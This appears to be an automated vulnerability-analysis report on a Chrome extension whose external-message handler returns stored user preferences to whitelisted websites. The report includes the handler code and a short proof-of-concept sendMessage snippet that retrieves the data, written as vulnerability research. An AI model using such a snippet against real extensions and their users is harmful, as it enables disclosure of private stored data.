# CoCo Analysis: ohhblkgfjjbjcaddddgooclkoeiiklgk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_sync_get_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ohhblkgfjjbjcaddddgooclkoeiiklgk/opgen_generated_files/bg.js
Line 727 var storage_sync_get_source = {'key': 'value'};

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ohhblkgfjjbjcaddddgooclkoeiiklgk/opgen_generated_files/bg.js
Line 965 chrome.runtime.onMessageExternal.addListener(async(t,r,e)=>{if(t.type=="fetch"){const a=await o(!1);if(await n(a.uid)!=="pro")return e({preference:null}),!0;chrome.storage.sync.get(["preference"],function(i){typeof i.preference<"u"&&i.preference!=="undefined"?e({preference:i.preference}):e({preference:null})})}});
i.preference

**Code:**

```javascript
// Background script (bg.js) - Entry point via external message
chrome.runtime.onMessageExternal.addListener(async(t,r,e)=>{
  if(t.type=="fetch"){
    const a=await o(!1);
    if(await n(a.uid)!=="pro")
      return e({preference:null}),!0;
    // Storage read - retrieves user preferences
    chrome.storage.sync.get(["preference"],function(i){
      typeof i.preference<"u"&&i.preference!=="undefined"?
        e({preference:i.preference}):  // <- sends stored data back to external caller
        e({preference:null})
    })
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any website whitelisted in manifest.json externally_connectable
// (reference.email, ref.email, localhost:8080, localhost)
chrome.runtime.sendMessage(
  "ohhblkgfjjbjcaddddgooclkoeiiklgk",  // Extension ID
  {type: "fetch"},
  function(response) {
    console.log("Leaked preference data:", response.preference);
    // Attacker receives user's stored preferences
  }
);
```

**Impact:** Information disclosure vulnerability. External websites whitelisted in externally_connectable can trigger storage reads and receive user preference data via sendResponse. Even though authentication is checked ("pro" status), the storage data is still leaked to the external caller. Per methodology rules, even if only specific domains can exploit this, it is still a TRUE POSITIVE.
